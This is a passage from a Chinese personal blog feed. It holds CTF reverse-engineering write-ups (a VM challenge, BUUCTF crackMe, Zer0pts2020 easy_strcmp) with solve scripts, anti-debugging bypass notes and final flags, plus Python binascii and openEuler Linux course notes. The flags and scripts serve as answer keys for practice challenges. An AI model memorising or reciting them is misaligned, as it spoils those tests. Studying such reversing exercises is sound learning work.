<span class="number">108</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">114</span>&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> v4[] = &#123;<span class="number">34</span>, <span class="number">63</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">24</span>, <span class="number">167</span>, <span class="number">49</span>, <span class="number">241</span>, <span class="number">40</span>, <span class="number">132</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">122</span>&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">100</span>] = &#123;&#125;; <span class="comment">// [esp+13h] [ebp-E5h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> z; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> x; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line">  x = <span class="number">15</span>;</span><br><span class="line">  z = <span class="number">15</span>;</span><br><span class="line">  m = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> k=<span class="built_in">strlen</span>(order) - <span class="number">1</span>;k&gt;=<span class="number">0</span>;k--)<span class="comment">//从后往前</span></span><br><span class="line">  &#123;</span><br><span class="line">i = order[k];</span><br><span class="line">    <span class="keyword">switch</span> ( opcode[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">--x;</span><br><span class="line">--z;</span><br><span class="line">        v5 = v4[z];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        flag[x] = v5 - opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        flag[x] = v5 + opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        flag[x] = v5 ^ opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        flag[x] = v5 / opcode[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v5 = flag[--m];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        flag[x] = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        flag[x] = v5 - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;757515121f3d478&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机逆向</title>
      <link href="/2022/08/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%86%E5%90%91/"/>
      <url>/2022/08/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[        <h1 id="虚拟机逆向"   >          <a href="#虚拟机逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#虚拟机逆向" class="headerlink" title="虚拟机逆向"></a>虚拟机逆向</h1>              <h2 id="什么是虚拟机逆向"   >          <a href="#什么是虚拟机逆向" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是虚拟机逆向" class="headerlink" title="什么是虚拟机逆向"></a>什么是虚拟机逆向</h2>      <p>虚拟机逆向针对的目标是出题人自行编写的小型虚拟机。与其说是虚拟机，更像是一个小型的解释执行系统或者模拟器（Emulator）。</p><p>所以虚拟机保护技术，是将程序可执行代码转化为自定义的中间操作码（Operation Code，如果操作码是一个字节，一般可以称为Bytecode），用以保护源程序不被逆向和篡改，opcode通过emulator解释执行，实现程序原来的功能。在这种情况下，如果要逆向程序，就需要对整个emulator结构进行逆向，理解程序功能，还需要结合opcode进行分析，整个程序逆向工程将会十分繁琐。</p><p>主要的分析对象有opcode，handler，虚拟机的初始化，入口，输入等</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF crackMe</title>
      <link href="/2022/08/08/%5BBUUCTF%5D%20crackMe/"/>
      <url>/2022/08/08/%5BBUUCTF%5D%20crackMe/</url>
      
        <content type="html"><![CDATA[        <h1 id="BUUCTF-crackMe"   >          <a href="#BUUCTF-crackMe" class="heading-link"><i class="fas fa-link"></i></a><a href="#BUUCTF-crackMe" class="headerlink" title="[BUUCTF] crackMe"></a>[BUUCTF] crackMe</h1>      <p>本题用于熟悉动调和对于反调试的练习</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203827.png" alt="image-20220808215802075"></p><p>找到主函数，user已有题目给给出，为<code>welcomebeijing</code>，只需逆向密码即可。</p><p>除去两个验证性的函数，只剩decode1和decode2</p><p>decode1</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203828.png" alt="image-20220808215953599"></p><p>decode1里面是由输入的user来生成一个key数组，由于输入已给出，key数组结果相当于已知</p><p>decode2</p><p>decode2函数开头一段是对输入的密码进行转换</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203829.png" alt="image-20220808220232175"></p><p>并且根据判断</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v10 = v9 + <span class="number">16</span> * v10;                        <span class="comment">// 一位一位的去读取数据，计入v9</span></span><br><span class="line"> <span class="keyword">if</span> ( !((<span class="type">int</span>)(v7 + <span class="number">1</span>) % <span class="number">2</span>) )</span><br><span class="line"> &#123;</span><br><span class="line">   password[v4++ - <span class="number">1</span>] = v10;                 <span class="comment">// 两位char组成一个16进制的数，存入v15</span></span><br><span class="line">   a1 = v4;</span><br><span class="line">   v10 = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></div></figure><p>可以得知，将输入的密码两位为一组看作一个16进制数，所以密码本身应该是16进制的</p><p>第二部分是对于密码的再次处理</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203830.png" alt="image-20220808220537892"></p><p>首先对key数组进行二次处理，然后再和密码进行异或</p><p>对于key数组的处理受到两个反调试的影响，动调前要先绕过</p><p>异或的结果放入sub_11470函数并且当v14 &#x3D;&#x3D; 0xAB94时才返回1</p><p>sub_11470函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203831.png" alt="image-20220808220802338"></p><p>注意5号位，若是动调时结果为f，没有被调试为s，所以和key数组异或后的结果的为<code>dbappsec</code></p><p>然后对程序进行动调来得出key数组的值</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203832.png" alt="image-20220808221037685"></p><p>最后这个值会被移到ecx寄存器里面和密码进行异或，直接读取ecx的值</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203833.png" alt="image-20220808221420834"></p><p>写出脚本，注意输出要用16进制输出</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string key = <span class="string">&quot;dbappsec&quot;</span>;</span><br><span class="line">    <span class="type">int</span> flag[] = &#123;<span class="number">0x2a</span>, <span class="number">0xd7</span>, <span class="number">0x92</span>, <span class="number">0xe9</span>, <span class="number">0x53</span>, <span class="number">0xe2</span>, <span class="number">0xc4</span>, <span class="number">0xcd</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> num = (<span class="type">int</span>)key[i];</span><br><span class="line">        <span class="type">int</span> ans = num ^ (<span class="type">int</span>)flag[i];</span><br><span class="line">        cout &lt;&lt; hex &lt;&lt; ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag：4eb5f3992391a1ae</span></span><br></pre></td></tr></table></div></figure><p>最后md5加密取32位小写</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d2be2981b84f2a905669995873d6a36c&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py库binascii</title>
      <link href="/2022/08/04/py%E5%BA%93binascii/"/>
      <url>/2022/08/04/py%E5%BA%93binascii/</url>
      
        <content type="html"><![CDATA[        <h1 id="python库——binascii"   >          <a href="#python库——binascii" class="heading-link"><i class="fas fa-link"></i></a><a href="#python库——binascii" class="headerlink" title="python库——binascii"></a>python库——binascii</h1>      <p><a href="https://docs.python.org/zh-cn/3/library/binascii.html#module-binascii"><code>binascii</code></a> 模块包含很多在二进制和二进制表示的各种ASCII码之间转换的方法。</p><p><code>binascii.b2a_hex(hexstr)</code> &#x2F; <code>binascii.a2b_hex(hexstr)</code></p><p>bin to ascii    &#x2F;     ascii to bin</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;abcdef&quot;</span></span><br><span class="line">flag = binascii.b2a_hex(key.encode())</span><br></pre></td></tr></table></div></figure><p>参数是str，注意类型转换</p><p>该函数后面可接参数使得从各种编码变成二进制或者将二进制变为各种编码</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">binascii.a2b_uu</span><br><span class="line"><span class="comment">#将单行 uu 编码数据转换成二进制数据并返回</span></span><br><span class="line"></span><br><span class="line">binascii.a2b_base64</span><br><span class="line"><span class="comment">#将 base64 数据块转换成二进制并以二进制数据形式返回。</span></span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Zer0pts2020 easy_strcmp_wp</title>
      <link href="/2022/08/04/%5BZer0pts2020%5Deasy%20strcmp/"/>
      <url>/2022/08/04/%5BZer0pts2020%5Deasy%20strcmp/</url>
      
        <content type="html"><![CDATA[        <h1 id="Zer0pts2020-easy-strcmp-个人记录"   >          <a href="#Zer0pts2020-easy-strcmp-个人记录" class="heading-link"><i class="fas fa-link"></i></a><a href="#Zer0pts2020-easy-strcmp-个人记录" class="headerlink" title="[Zer0pts2020]easy strcmp  个人记录"></a>[Zer0pts2020]easy strcmp  个人记录</h1>      <p>ida64打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203759.png" alt="image-20220804222731151"></p><p>直接提交<code>zer0pts&#123;********CENSORED********&#125;</code>是错误的</p><p>动调的结果发现，这个strcmp函数导向了另一个函数的位置</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132203760.png" alt="image-20220804223353530"></p><p>写脚本，注意大小端，要倒序</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&quot;********CENSORED********&quot;</span></span><br><span class="line">qword_201060 = [<span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):  <span class="comment">#3的话是因为24/8=3----&gt;********CENSORED********</span></span><br><span class="line">    z = str1[i * <span class="number">8</span> : (i + <span class="number">1</span>) * <span class="number">8</span>]                           <span class="comment">#分成三份,也就是八个一组</span></span><br><span class="line">    x = binascii.b2a_hex(z.encode(<span class="string">&#x27;ascii&#x27;</span>)[::-<span class="number">1</span>])  <span class="comment">#将里面的元素转换为16进制的ascii</span></span><br><span class="line">    y = binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(x, <span class="number">16</span>) + qword_201060[i])[<span class="number">2</span>:])[::-<span class="number">1</span>]   <span class="comment">#与201060的元素相加</span></span><br><span class="line">    flag += y</span><br><span class="line"><span class="built_in">print</span>(flag + <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>openEuler公开课</title>
      <link href="/2022/07/17/openEuler%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
      <url>/2022/07/17/openEuler%E5%85%AC%E5%BC%80%E8%AF%BE/</url>
      
        <content type="html"><![CDATA[        <h1 id="openEuler课程-7-Days"   >          <a href="#openEuler课程-7-Days" class="heading-link"><i class="fas fa-link"></i></a><a href="#openEuler课程-7-Days" class="headerlink" title="openEuler课程(7 Days)"></a>openEuler课程(7 Days)</h1>      <p>虽然说是openEuler，不如说是Linux系统的观光旅游</p>        <h2 id="Day-1"   >          <a href="#Day-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2>      <p>今天主要学习了什么是openEuler，如何将openEuler安装到云上</p>        <h2 id="Day-2"   >          <a href="#Day-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2>              <h3 id="开源许可证"   >          <a href="#开源许可证" class="heading-link"><i class="fas fa-link"></i></a><a href="#开源许可证" class="headerlink" title="开源许可证"></a>开源许可证</h3>      <p>GPL，GPL V2, LGPL, MulanPSL v2</p>        <h3 id="学习Linux-基于openEuler"   >          <a href="#学习Linux-基于openEuler" class="heading-link"><i class="fas fa-link"></i></a><a href="#学习Linux-基于openEuler" class="headerlink" title="学习Linux(基于openEuler)"></a>学习Linux(基于openEuler)</h3>              <h4 id="Linux-From-Scratch"   >          <a href="#Linux-From-Scratch" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux-From-Scratch" class="headerlink" title="Linux From Scratch"></a>Linux From Scratch</h4>      <p>可以去构建并编译一个属于自己的Linux的操作系统</p><p>Linux内核只是一个符合POSIX标准的内核，提供一套应用程序接口(API)，并不是一个完整的操作系统</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132226885.png" alt="image-20220712193216583"></p><p>openEuler脱胎于EulerOS，是华为发行的基于Linux内核的服务器操作系统</p>        <h4 id="如何登录Linux"   >          <a href="#如何登录Linux" class="heading-link"><i class="fas fa-link"></i></a><a href="#如何登录Linux" class="headerlink" title="如何登录Linux"></a>如何登录Linux</h4>      <p>本地登录&#x2F;远程登录</p><p>shell</p><p>shell是用c语言写的程序，是用户使用Linux的桥梁，用户通过shell命令来控制Linux</p><p>Linux用户</p><p>root是Linux是系统中的一个特殊管理员，拥有最高的权限，甚至无限破坏系统</p><p>使用<code>su -username</code>的方式切换用户</p>        <h4 id="Linux命令行基础知识"   >          <a href="#Linux命令行基础知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#Linux命令行基础知识" class="headerlink" title="Linux命令行基础知识"></a>Linux命令行基础知识</h4>              <h5 id="登录命令"   >          <a href="#登录命令" class="heading-link"><i class="fas fa-link"></i></a><a href="#登录命令" class="headerlink" title="登录命令"></a>登录命令</h5>      <p>login </p><p>使用Alt + F1-F6 来切换不同的虚拟控制台</p><p>last </p><p>显示近期用户或者终端的登录情况</p><p>exit</p><p>退出系统</p>        <h5 id="电源管理"   >          <a href="#电源管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#电源管理" class="headerlink" title="电源管理"></a>电源管理</h5>      <p>shutdown </p><p>关闭计算机，权限是超级用户</p><p>halt</p><p>关闭系统，权限是超级用户</p><p>reboot</p><p>重启，权限是系统管理者</p>        <h5 id="文件管理命令"   >          <a href="#文件管理命令" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件管理命令" class="headerlink" title="文件管理命令"></a>文件管理命令</h5>      <p>在Linux中，一切皆是文件</p><p><code>/</code>为根目录</p><p><code>/bin</code> binary 存放常用命令</p><p><code>/boot</code>存放Linux启动时的核心文件，包括镜像文件和连接文件</p><p><code>/dev</code>device 设备，存放外部设备</p><p><code>/etc</code>存放管理系统的配置文件和子目录</p><p><code>/lib</code>存放动态连接共享库</p><p><code>/mnt</code>让用户临时挂在别的文件系统，例如光驱</p><p><code>/opt</code>给主机额外安装软件的目录</p><p><code>/proc</code>提供系统内存映射，此目录是虚拟目录</p><p><code>/root</code>系统管理员目录</p><p><code>/run</code>临时文件系统，系统重启时会清空</p><p><code>/sbin</code> super bin 系统管理员目录</p><p><code>srv</code>server 存放一些服务启动后所需的数据</p><p><code>/sys</code>文件系统sysfs</p><p><code>/tmp</code>存放临时文件</p><p><code>/usr</code>用户的许多应用和文件</p><p><code>/var</code>存放不断扩充的东西，例如各种日志文件</p><p><code>/home</code>主目录</p><p>Linux文件路径</p><p>绝对路径：从根目录<code>/</code>开始的路径</p><p>相对路径：相对于当前文件夹的路径</p><p>pwd</p><p>打印当前的目录</p><p>cd </p><p>改变目录</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd .. 进入上一目录</span><br><span class="line">cd .  进入当前目录</span><br><span class="line">cd    返回home目录</span><br><span class="line">cd -  进入前一个目录</span><br><span class="line">cd ~  返回home目录</span><br></pre></td></tr></table></div></figure><p>ls</p><p>列出文件目录或文件信息</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l 列出详细资料（后可以接指定文件）</span><br><span class="line">ls -a/-A 显示所有文件目录（包括隐藏、不包括隐藏）</span><br><span class="line">ls -R 若目录下有文件亦同时列出</span><br></pre></td></tr></table></div></figure><p>mkdir [name]</p><p>创建文件夹</p><p>touch</p><p>创建空文件或者修改文件的时间戳</p><p>cp</p><p>复制文件或者目录，一个或多个</p><p>mv</p><p>移动文件或目录</p><p>rm</p><p>删除文件或目录</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -r 将目录即子目录递归删除</span><br><span class="line">rm -f 强制删除</span><br></pre></td></tr></table></div></figure><p>cat</p><p>读取文件或者将多个文件合并为一个文件</p><p>head&#x2F;tail</p><p>显示文件的前&#x2F;后文件的x行</p><p>more</p><p>以一页一页的形式显示</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SPACE：下一屏</span><br><span class="line">RETURN：下一行</span><br><span class="line">q：退出</span><br><span class="line">Ctrl+B：返回上一屏</span><br></pre></td></tr></table></div></figure><p>less</p><p>读取内容，附带搜索功能</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-f 强制打开</span><br><span class="line">/字符串 向下搜索</span><br><span class="line">?字符串 向上搜索</span><br><span class="line">b enter 上下一页</span><br><span class="line">u d 上下半页 </span><br></pre></td></tr></table></div></figure><p>find</p><p>在指定目录下寻找文件</p><p>locate</p><p>快速查找文件系统内是否有指定文件</p><p>which</p><p>查看某个命令的位置及是否存在</p><p>gzip&#x2F;tar</p><p>压缩包</p><p>ln</p><p>创建链接文件</p><p>软连接：类似快捷方式，删除源文件后失效，可以对目录链接甚至跨文件系统</p><p>硬链接：以副本形式存在，但不占用空间，不可跨文件系统，补课链接目录</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln    默认为硬链接</span><br><span class="line">ln -s 软连接</span><br></pre></td></tr></table></div></figure>        <h2 id="Day-3"   >          <a href="#Day-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h2>              <h3 id="文本编辑器和文本处理"   >          <a href="#文本编辑器和文本处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#文本编辑器和文本处理" class="headerlink" title="文本编辑器和文本处理"></a>文本编辑器和文本处理</h3>      <p>常用的有emacs vi vim nano gedit kedit</p>        <h3 id="使用vim"   >          <a href="#使用vim" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用vim" class="headerlink" title="使用vim"></a>使用vim</h3>      <p>自行查找文档</p>        <h2 id="Day-4"   >          <a href="#Day-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day-4" class="headerlink" title="Day 4"></a>Day 4</h2>              <h2 id="用户和权限管理"   >          <a href="#用户和权限管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#用户和权限管理" class="headerlink" title="用户和权限管理"></a>用户和权限管理</h2>              <h3 id="管理用户和组"   >          <a href="#管理用户和组" class="heading-link"><i class="fas fa-link"></i></a><a href="#管理用户和组" class="headerlink" title="管理用户和组"></a>管理用户和组</h3>      <p>Linux是一个多用户的操作系统</p><p>每个用户使用系统资源前要先向系统管理员申请一个账号，再用这个账号进行登录</p><p>每个用户都会有一个单独的UID</p><p>超级用户，root用户   UID 0</p><p>普通用户                      UID 1000-60000</p><p>虚拟用户                      UID 1-999</p><p>使用id命令来查看用户的id和信息</p><p>每个用户有自己的用户名，密码，主目录等信息</p><p>useradd</p><p>用于创建用户账号，并保留在<code>/etc/passwd</code>中</p><p>usermod</p><p>用于修改用户账号的各类信息</p><p>用户信息 <code>name:password:uid:gid:comment:home:shell</code></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-c     修改备注</span><br><span class="line">-d     修改登陆目录</span><br><span class="line">-e     修改有效期</span><br><span class="line">-f     修改缓冲天数（密码过期后多少天关闭该账号）</span><br><span class="line">-g     修改群组</span><br><span class="line">-G     修改用户所属的附加群组</span><br><span class="line">-l     修改</span><br><span class="line">-L     锁定用户密码使密码无效</span><br><span class="line">-s&lt;shell&gt; 修改登录后使用的shell</span><br><span class="line">-u&lt;uid&gt;   修改用户ID</span><br><span class="line">-U        解除密码锁定</span><br></pre></td></tr></table></div></figure><p>userdel</p><p>删除用户</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f  强制删除</span><br><span class="line">-r  删除用户包括用户文件</span><br></pre></td></tr></table></div></figure><p>passwd</p><p>用于修改用户的密码及其相关的信息</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-n      设置修改密码最短天数</span><br><span class="line">-x      设置修改密码最长天数</span><br><span class="line">-w设置过期多少天前收到警告信息</span><br><span class="line">-i      密码过期后多少天禁用账户</span><br><span class="line">-d      删除用户密码</span><br><span class="line">-S      显示用户密码</span><br></pre></td></tr></table></div></figure><p>用户组的相关概念</p><p>用户组是具有相同特性用户的逻辑集合，通过组的形式来统一管理，每个用户组有一个特有的id号GID</p><p>每个用户添加时默认有一个与用户名同名且UID和GID相同的用户组</p><p>root组 UID0</p><p>普通用户组 UID500-60000</p><p>系统用户 UID1-499</p><p>管理用户组</p><p>groupadd</p><p>创建新的用户组，并将组的信息添加到系统文件</p><p>使用cat &#x2F;etc&#x2F;group查看是否创建成功</p><p>groupmod</p><p>用于修改用户组的识别码或者名称</p><p>groupdel</p><p>删除用户组，但用户需要先删除再删除用户组</p><p>gpasswd</p><p>添加或者删除用户到组中</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpasswd -a user usergroup     将user用户关联到用户组usergroup</span><br><span class="line">groups user       查看user用户加入的用户组</span><br></pre></td></tr></table></div></figure><p>用户和组的关联文件</p><p>&#x2F;etc&#x2F;passwd文件    用户账号信息</p><p>&#x2F;etc&#x2F;shadow文件   用户账号信息加密文件</p><p>&#x2F;etc&#x2F;group文件      组信息文件</p><p>&#x2F;etc&#x2F;gshadow文件  组加密文件</p>        <h3 id="文件权限管理"   >          <a href="#文件权限管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件权限管理" class="headerlink" title="文件权限管理"></a>文件权限管理</h3>      <p>文件权限的基本概念</p><p>文件权限一般分为读，写，执行</p><p>在Linux系统中，不同的用户所处的地位也不尽相同，不同地位的用户拥有不同的权限等级</p><p>分为三种：</p><ol><li>只允许自己访问</li><li>允许一个特定的用户组访问</li><li>允许任意用户访问</li></ol><p>文件的权限位说明</p><p>​      d                r w x            r - x               r - x</p><p>文件类型      读 写 执行     读 - 执行      读 - 执行</p><p>​                       属主权限     属组权限     其他用户权限</p><p>chmod</p><p>修改文件权限</p><div class="table-container"><table><thead><tr><th>操作对象</th><th>操作符</th><th>权限</th></tr></thead><tbody><tr><td>u  属主</td><td>+ 添加权限</td><td>r  读</td></tr><tr><td>g  属组</td><td>- 减少权限</td><td>w  写</td></tr><tr><td>o  其他用户</td><td>&#x3D;  给予特定权限</td><td>x  执行</td></tr><tr><td>a  所有用户</td><td></td><td></td></tr></tbody></table></div><p>亦可以直接修改权限码</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 644 usertxt</span><br></pre></td></tr></table></div></figure><p>chown</p><p>修改文件属主或属组</p><p>chgrp</p><p>修改文件属组</p><p>umask</p><p>遮罩码</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">umask  查看权限掩码</span><br><span class="line">umask 0022  修改为0022</span><br></pre></td></tr></table></div></figure><p>文件的ACL（Access Control List）权限控制列表</p><p>ACL又文件系统支持，可以更加细化的去修改不同用户的权限</p>        <h3 id="其他权限管理"   >          <a href="#其他权限管理" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他权限管理" class="headerlink" title="其他权限管理"></a>其他权限管理</h3>      <p>su 仅切换用户身份</p><p>su - 切换用户身份和shell</p><p>sudo 允许普通用户执行管理员才能执行的命令</p>        <h2 id="Day-5"   >          <a href="#Day-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#Day-5" class="headerlink" title="Day 5"></a>Day 5</h2>              <h3 id="安装软件并管理服务"   >          <a href="#安装软件并管理服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#安装软件并管理服务" 